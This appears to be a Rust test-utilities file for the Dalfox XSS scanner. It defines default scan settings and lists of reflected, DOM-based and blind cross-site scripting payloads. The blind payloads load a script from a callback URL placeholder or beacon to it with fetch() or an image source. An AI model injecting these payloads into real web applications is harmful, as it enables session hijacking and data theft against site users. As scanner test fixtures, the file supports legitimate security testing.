//! Common test utilities and helpers for Dalfox tests
//!
//! This module provides shared test infrastructure including:
//! - ScanArgs factory for creating test configurations
//! - Mock server helpers for testing HTTP interactions
//! - Shared XSS payload vectors for consistent testing

use dalfox::cmd::scan::ScanArgs;

/// Factory function to create default ScanArgs for testing
pub fn create_test_scan_args() -> ScanArgs {
    ScanArgs {
        input_type: "auto".to_string(),
        format: "json".to_string(),
        targets: vec![],
        param: vec![],
        data: None,
        headers: vec![],
        cookies: vec![],
        method: "GET".to_string(),
        user_agent: None,
        cookie_from_raw: None,
        mining_dict_word: None,
        skip_mining: false,
        skip_mining_dict: false,
        skip_mining_dom: false,
        skip_discovery: false,
        skip_reflection_header: false,
        skip_reflection_cookie: false,
        skip_reflection_path: false,
        timeout: 10,
        delay: 0,
        proxy: None,
        follow_redirects: false,
        output: None,
        include_request: false,
        include_response: false,
        silence: false,
        poc_type: "plain".to_string(),
        limit: None,
        workers: 10,
        max_concurrent_targets: 10,
        max_targets_per_host: 100,
        encoders: vec!["url".to_string(), "html".to_string()],
        custom_blind_xss_payload: None,
        blind_callback_url: None,
        custom_payload: None,
        only_custom_payload: false,
        skip_xss_scanning: false,
        deep_scan: false,
        sxss: false,
        sxss_url: None,
        sxss_method: "GET".to_string(),
        skip_ast_analysis: false,
        remote_payloads: vec![],
        remote_wordlists: vec![],
    }
}

/// Factory function to create ScanArgs with XSS scanning skipped (for unit tests)
pub fn create_test_scan_args_skip_xss() -> ScanArgs {
    let mut args = create_test_scan_args();
    args.skip_xss_scanning = true;
    args
}

/// Common reflected XSS test payloads
pub fn reflected_xss_payloads() -> Vec<&'static str> {
    vec![
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
    ]
}

/// Common blind XSS test payloads (with placeholder for callback URL)
pub fn blind_xss_payloads() -> Vec<&'static str> {
    vec![
        "\"'><script src={}></script>",
        "<img src=x onerror=\"(new Image).src='{}'\">",
        "<svg/onload=\"fetch('{}')\">",
    ]
}

/// Common DOM-based XSS test payloads
pub fn dom_xss_payloads() -> Vec<&'static str> {
    vec![
        "#<img src=x onerror=alert(1)>",
        "?xss=<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(1) class=dalfox>",
    ]
}
